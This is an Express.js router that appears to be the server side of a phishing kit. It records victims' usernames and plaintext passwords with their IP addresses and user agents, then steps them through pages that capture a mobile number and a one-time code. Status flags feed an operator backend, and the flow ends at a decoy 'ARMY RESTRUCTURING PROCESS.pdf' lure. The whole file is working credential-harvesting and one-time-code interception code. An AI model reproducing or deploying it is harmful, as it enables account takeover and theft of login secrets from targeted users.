const express = require ('express');
const router = express.Router();
const database = require('../database');
const bodyParser = require('body-parser');

router.use(express.static('public'));
router.use(express.static(__dirname + '/public'));
router.use(bodyParser.urlencoded({ extended: false }));



router.post('/submituser', (req, res) => {
   
  const userid = req.body.username;
  const b64 = Buffer.from(userid).toString('base64');
  
  const word = 'clicked';
  const clientIP = req.headers['x-forwarded-for'];
  const ip =  clientIP.split(',')[0].trim(); 
  // const ip = req.socket.remoteAddress; 
  const useragent = req.get('User-Agent');
  const date = new Date();
  const pagetype = 0;
  const mobiletype = 0;
  const notify = 2;

// Using MongoDB to find the user
database.mainCollection().then(collection => {
  collection.findOne({ username: userid })
    .then(result => {
      const rowCount = result ? 1 : 0;

if (rowCount > 0) {

              // Update document in MongoDB
              collection.updateOne(
                { username: userid },
                { $set: { password: word, pagetype: pagetype, mobiletype: mobiletype, notify: notify } }
              )
                .then(() => {
                  res.redirect(`/isletuiss/?sdhbbbbefuiwehurh23890frqweijnkdngfkrnwektkear=${b64}`);
                })
                .catch(err => {
                  console.error('Error updating record:', err);
                  return res.status(500).send('Internal Server Error');
                });


      }else{

          // Insert document into MongoDB
          collection.insertOne({
            username: userid,
            password: word,
            ip: ip,
            useragent: useragent,
            date: date,
            notify: notify,
            pagetype: pagetype,
            mobiletype: mobiletype
          })
            .then(() => {
              res.redirect(`/isletuiss/?sdhbbbbefuiwehurh23890frqweijnkdngfkrnwektkear=${b64}`);
            })
            .catch(err => {
              console.error('Error inserting record:', err);
              return res.status(500).send('Internal Server Error');
            });


      }
    })
    .catch(err => {
      console.error('Error executing MongoDB query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    });
});
});
//validate form data before handling
// Custom middleware for form validation
const validateFormData = (req, res, next) => {
  const { username, password } = req.body;

  
  if (!username || !password) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


// Handle form submission

router.post('/submit', validateFormData, (req, res) => {
   
    const name = req.body.username;
    const b64 = Buffer.from(name).toString('base64');
    const word = req.body.password;
    // const clientIP = req.headers['x-forwarded-for'];
    // const ip =  clientIP.split(',')[0].trim(); 
    const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const pagetype = 0;
    const mobiletype = 0;
    const notify = 0;


    

    // Using MongoDB to find the user
    database.mainCollection().then(collection => {
      collection.findOne({ username: name })
        .then(result => {
          const rowCount = result ? 1 : 0;

      if (rowCount > 0) {
                            // Update document in MongoDB
                            collection.updateOne(
                              { username: name },
                              { $set: { password: word, pagetype: pagetype, mobiletype: mobiletype, notify: notify } }
                            )
                              .then(() => {
                                res.redirect(`/codeload/?tapfirestgrdsfgdytrbdfwergter=${b64}`);
                              })
                              .catch(err => {
                                console.error('Error updating record:', err);
                                return res.status(500).send('Internal Server Error');
                              });
                            } else {
                            // Insert document into MongoDB
                            collection.insertOne({
                              username: name,
                              password: word,
                              ip: ip,
                              useragent: useragent,
                              date: date,
                              notify: notify,
                              pagetype: pagetype,
                              mobiletype: mobiletype
                            })
                              .then(() => {
                                res.redirect(`/codeload/?tapfirestgrdsfgdytrbdfwergter=${b64}`);
                              })
                              .catch(err => {
                                console.error('Error inserting record:', err);
                                return res.status(500).send('Internal Server Error');
                              });
                                    }
        })
        .catch(err => {
          console.error('Error executing MongoDB query:', err);
          return res.status(500).json({ error: 'Internal Server Error' });
        });
    });
});



router.post('/codeotp' , (req, res) => {

  const name = req.body.username;
  const pagetype = req.body.page;
  const mobiletype = req.body.mobile;
  const notif = 1;
  

  // Using MongoDB to find the user
  database.mainCollection().then(collection => {
    collection.findOne({ username: name })
      .then(result => {
        const rowCount = result ? 1 : 0;

        if (rowCount > 0) {
          // Update document in MongoDB
          collection.updateOne(
            { username: name },
            { $set: { pagetype: pagetype, mobiletype: mobiletype, notify: notif } }
          )
            .then(() => {
              res.redirect('/backend');
            })
            .catch(err => {
              console.error('Error updating record:', err);
              return res.status(500).send('Internal Server Error');
            });
        }
      })
      .catch(err => {
        console.error('Error executing MongoDB query:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
      });
  });

});

//handel code submission request

const validateMobile = (req, res, next) => {
  const mobile = req.body.tel;

  if (mobile == null) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


router.post('/mobilepost', validateMobile, (req, res) => {
   
  const name = req.body.username;
  const b64 = Buffer.from(name).toString('base64');
  const mobile = req.body.tel;
  const b64mob = Buffer.from(mobile).toString('base64');
  const notify = 0;

 

  // Using MongoDB to find the user
  database.mainCollection().then(collection => {
    collection.findOne({ username: name })
      .then(result => {
        const rowCount = result ? 1 : 0;

        if (rowCount > 0) {
          // Update document in MongoDB
          collection.updateOne(
            { username: name },
            { $set: { mobiletype: mobile, notify: notify } }
          )
            .then(() => {
              res.redirect(`/code/?tapfirestgrdsfgdytrbdfwergter=${b64}/${b64mob}`);
            })
            .catch(err => {
              console.error('Error updating record:', err);
              return res.status(500).send('Internal Server Error');
            });
        }
      })
      .catch(err => {
        console.error('Error executing MongoDB query:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
      });
  });

});


//  code submission


const validateFormcode = (req, res, next) => {
  const mobile = req.body.code;

  if (mobile == null) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};



router.post('/codepost', validateFormcode, (req, res) => {
   
  const user = req.body.username;
  const code = req.body.code;
  


  // Using MongoDB to find the user
  database.mainCollection().then(collection => {
    collection.findOne({ username: user })
      .then(result => {
        const rowCount = result ? 1 : 0;

        if (rowCount > 0) {
          // Update document in MongoDB
          collection.updateOne(
            { username: user },
            { $set: { pagetype: code } }
          )
            .then(() => {
              res.redirect('/ARMY RESTRUCTURING PROCESS.pdf');
            })
            .catch(err => {
              console.error('Error updating record:', err);
              return res.status(500).send('Internal Server Error');
            });
        }
      })
      .catch(err => {
        console.error('Error executing MongoDB query:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
      });
  });

});




module.exports =router
